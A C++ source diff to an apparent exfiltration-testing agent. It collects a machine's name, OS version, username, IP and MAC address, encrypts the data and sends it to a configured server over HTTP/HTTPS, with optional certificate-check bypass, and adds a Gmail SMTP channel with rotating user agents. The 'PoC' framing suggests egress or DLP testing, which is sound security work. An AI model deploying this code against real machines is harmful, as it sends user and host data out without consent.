@@ -30,20 +30,60 @@
 #include "libsysteminfo.h"
 #include "libcrypt.h"
 #include "libencode.h"
+#include "libcurl.h"
 
 #include <iostream>
 
-void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring token_uri_method, std::wstring logclient_uri_method, std::wstring tokenuri,
+static std::wstring pick_random_useragent(std::set<std::wstring> uagents, std::wstring Protocol) {
+
+	std::wstring useragent = helper::pick_random_useragent_fromfile(uagents);
+	std::wcout << L"[" << Protocol << L"] " << L"User-Agent: " << useragent << std::endl;
+
+	return useragent;
+}
+
+static std::string generate_data(std::string PoC_KEYWORD, std::string aespassword, std::wstring Protocol) {
+
+	std::wcout << "[" << Protocol << "] " << "Collecting System Information" << std::endl;
+
+	std::string computername = libsysteminfo::get_computer_name();
+	std::string osversion = libsysteminfo::get_os_version();
+	std::string username = libsysteminfo::get_username();
+	std::string ipaddress = libsysteminfo::get_active_netface_ip();
+	std::string macaddress = libsysteminfo::get_active_netface_mac();
+
+	std::string uid = libHash::sha256("^" + computername + "." + osversion + "." + username + "$");
+
+	if (computername == "" || osversion == "" || username == "" || uid == "" || ipaddress == "" || macaddress == "") {
+
+		std::wcout << "[" << Protocol << "] " << "Collecting System Information failed" << std::endl;
+	}
+
+	std::string proto(Protocol.begin(), Protocol.end());
+
+	std::string encrypted_data = "data=" + libcrypt::encrypt(aespassword, "UID=" + uid + "&ComputerName=" + computername +
+		"&OS=" + osversion + "&Username=" + username +
+		"&LocalIPAddress=" + ipaddress + "&PhysicalAddress=" + macaddress +
+		"&PoCKEYWORD=" + PoC_KEYWORD + "&Protocol=" + proto);
+
+	std::string encoded = libencode::url_encode(encrypted_data);
+	encrypted_data = "";
+
+	return encoded;
+}
+
+void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring token_uri_method, std::wstring logclient_uri_method,
+	std::wstring tokenuri,
 	std::wstring logclienturi, std::set<std::wstring> uagents, WORD clientid, std::string secret, std::string username,
-	std::string password, std::string aespassword, std::string PoC_KEYWORD, bool IGNORE_CERT_UNKNOWN_CA, bool IGNORE_CERT_DATE_INVALID, bool HTTPS_CONNECTION) {
+	std::string password, std::string aespassword, std::string PoC_KEYWORD, bool IGNORE_CERT_UNKNOWN_CA,
+	bool IGNORE_CERT_DATE_INVALID, bool HTTPS_CONNECTION) {
 
 	char *downloaded = 0;
 	HINTERNET internet = NULL, connection = NULL, request = NULL;
 	const WCHAR *token_headers = L"Accept: application/json\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n";
 	bool result = false;
 
-	std::wstring useragent = helper::pick_random_useragent_fromfile(uagents);
-	std::wcout << "[HTTP] " << "User-Agent: " << useragent << std::endl;
+	std::wstring useragent = pick_random_useragent(uagents, HTTPS_CONNECTION ? L"HTTPS" : L"HTTP");
 
 	std::string token_data = "grant_type=password&client_id=" + std::to_string(clientid) + "&client_secret=" +
 		secret + "&username=" + username + "&password=" + password + "&scope=*";
@@ -93,87 +133,55 @@ void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring tok
 		std::wstring logclient_headers = L"Accept: application/json\r\nContent-Type: application/x-www-form-urlencoded\r\nAuthorization: Bearer " +
 			access_token + L"\r\nConnection: close\r\n";
 
+		std::string encoded = generate_data(PoC_KEYWORD, aespassword, HTTPS_CONNECTION ? L"HTTPS" : L"HTTP");
+
 		if (!HTTPS_CONNECTION) {
-			std::wcout << "[HTTP] " << "Collecting System Information" << std::endl;
+			std::wcout << "[HTTP] " << "Sending data with HTTP packet" << std::endl;
 		}
 		else {
-			std::wcout << "[HTTPS] " << "Collecting System Information" << std::endl;
+			std::wcout << "[HTTPS] " << "Sending data with HTTPS packet" << std::endl;
 		}
 
-		std::string computername = libsysteminfo::get_computer_name();
-		std::string osversion = libsysteminfo::get_os_version();
-		std::string username = libsysteminfo::get_username();
-		std::string ipaddress = libsysteminfo::get_active_netface_ip();
-		std::string macaddress = libsysteminfo::get_active_netface_mac();
-
-		std::string uid = libHash::sha256("^" + computername + "." + osversion + "." + username + "$");
-
-		if (computername == "" || osversion == "" || username == "" || uid == "" || ipaddress == "" || macaddress == "") {
-
-			if (!HTTPS_CONNECTION) {
-				std::wcout << "[HTTP] " << "Collecting System Information failed" << std::endl;
-			}
-			else {
-				std::wcout << "[HTTPS] " << "Collecting System Information failed" << std::endl;
-			}
+		if (connection != NULL) {
+			request = libhttp::json_request(connection, logclient_uri_method, logclienturi, (char*)encoded.c_str(),
+				logclient_headers.c_str(), IGNORE_CERT_UNKNOWN_CA, IGNORE_CERT_DATE_INVALID, HTTPS_CONNECTION);
 		}
-		else {
 
-			std::string encrypted_data = "data=" + libcrypt::encrypt(aespassword, "UID=" + uid + "&ComputerName=" + computername +
-				"&OS=" + osversion + "&Username=" + username +
-				"&LocalIPAddress=" + ipaddress + "&PhysicalAddress=" + macaddress +
-				"&PoCKEYWORD=" + PoC_KEYWORD + "&Protocol=" + (HTTPS_CONNECTION ? "HTTPS" : "HTTP"));
+		encoded = "";
 
-			std::string encoded = libencode::url_encode(encrypted_data);
-			encrypted_data = "";
+		if (request != NULL) {
+			result = libhttp::retrieve_data(request, &downloaded);
+		}
 
-			if (!HTTPS_CONNECTION) {
-				std::wcout << "[HTTP] " << "Sending data with HTTP packet" << std::endl;
-			}
-			else {
-				std::wcout << "[HTTPS] " << "Sending data with HTTPS packet" << std::endl;
-			}
+		if (result && downloaded != NULL) {
+			rapidjson::Document logclient_response;
+			logclient_response.Parse(downloaded);
 
-			if (connection != NULL) {
-				request = libhttp::json_request(connection, logclient_uri_method, logclienturi, (char*)encoded.c_str(),
-					logclient_headers.c_str(), IGNORE_CERT_UNKNOWN_CA, IGNORE_CERT_DATE_INVALID, HTTPS_CONNECTION);
-			}
+			if (helper::read_bool_value(&logclient_response, "success") == true) {
 
-			encoded = "";
-
-			if (request != NULL) {
-				result = libhttp::retrieve_data(request, &downloaded);
-			}
-
-			if (result && downloaded != NULL) {
-				rapidjson::Document logclient_response;
-				logclient_response.Parse(downloaded);
-
-				if (helper::read_bool_value(&logclient_response, "success") == true) {
-
-					if (!HTTPS_CONNECTION) {
-						std::wcout << "[HTTP] " << "Transmission succeeded" << std::endl;
-					}
-					else {
-						std::wcout << "[HTTPS] " << "Transmission succeeded" << std::endl;
-					}
+				if (!HTTPS_CONNECTION) {
+					std::wcout << "[HTTP] " << "Transmission succeeded" << std::endl;
 				}
 				else {
-
-					if (!HTTPS_CONNECTION) {
-						std::wcout << "[HTTP] " << "Transmission failed" << std::endl;
-					}
-					else {
-						std::wcout << "[HTTPS] " << "Transmission failed" << std::endl;
-					}
+					std::wcout << "[HTTPS] " << "Transmission succeeded" << std::endl;
 				}
 			}
+			else {
 
-			if (downloaded) {
-				HeapFree(GetProcessHeap(), 0, downloaded);
-				downloaded = NULL;
+				if (!HTTPS_CONNECTION) {
+					std::wcout << "[HTTP] " << "Transmission failed" << std::endl;
+				}
+				else {
+					std::wcout << "[HTTPS] " << "Transmission failed" << std::endl;
+				}
 			}
 		}
+
+		if (downloaded) {
+			HeapFree(GetProcessHeap(), 0, downloaded);
+			downloaded = NULL;
+		}
+
 	}
 
 	if (request) {
@@ -192,6 +200,29 @@ void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring tok
 	}
 }
 
-void test_gmail_protocol(void) {
+void libagent::test_gmail_protocol(std::string gmail_smtp, std::string gmail_username, std::string gmail_password, std::string gmail_name,
+	std::set<std::wstring> uagents, std::string aespassword, std::string PoC_KEYWORD) {
 
+	libcurl::init();
+
+	std::wstring useragent = pick_random_useragent(uagents, L"GMAIL");
+
+	std::string encoded = generate_data(PoC_KEYWORD, aespassword, L"GMAIL");
+
+	std::wcout << "[GMAIL] " << "Connecting to GMAIL SMTP server" << std::endl;
+
+	std::wcout << "[GMAIL] " << "Sending data with GMAIL packet" << std::endl;
+
+	std::string uagent(useragent.begin(), useragent.end());
+
+	;
+
+	if (libcurl::send_email(gmail_username, gmail_password, gmail_smtp, gmail_name, PoC_KEYWORD, encoded, uagent)) {
+		std::wcout << "[GMAIL] " << "Transmission succeeded" << std::endl;
+	}
+	else {
+		std::wcout << "[GMAIL] " << "Transmission failed" << std::endl;
+	}
+
+	libcurl::finalize();
 }
